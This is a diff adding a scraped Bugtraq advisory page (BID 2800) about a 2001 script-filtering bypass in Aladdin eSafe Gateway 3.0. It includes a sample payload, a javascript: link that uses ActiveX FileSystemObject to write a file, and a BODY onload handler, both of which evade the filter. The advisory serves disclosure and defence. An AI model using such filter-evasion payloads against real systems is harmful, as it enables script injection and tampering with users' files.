@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid2800<p><b><span style="font-size: 18pt;">eSafe Gateway HTML tag Script-filtering Bypass Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2800/info">info</a><br><a href="http://www.securityfocus.com/bid/2800/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2800/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2800/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2800/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2800
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 29 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 29 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was posted to BugTraq by eDvice Security Services &lt;support@edvicetech.com&gt; on May 29th, 2001.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Aladdin Knowledge Systems eSafe Gateway 3.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	This sample exploit was submitted to BugTraq by eDvice Security Services &lt;support@edvicetech.com&gt; on May 29th, 2001:<br/><br/>For example, the following potentially harmful script will go<br/>undetected by eSafe, even if the "remove all scripts" option is enabled:<br/><br/><br/>&lt;A HREF="javascript:var fso = new<br/>ActiveXObject('Scripting.FileSystemObject');var a =<br/>fso.CreateTextFile('c:\\testfile2.txt', true);a.WriteLine('This is a<br/>test.');a.Close();"&gt;Click here&lt;/A&gt;<br/><br/>HREF is not the only tag ignored. Any tag capable of containing scripting<br/>command will not be filtered by eSafe. For example:<br/><br/>&lt;BODY onload="alert('hi');"&gt;
+	
+		<ul>
+</ul>
+</div>
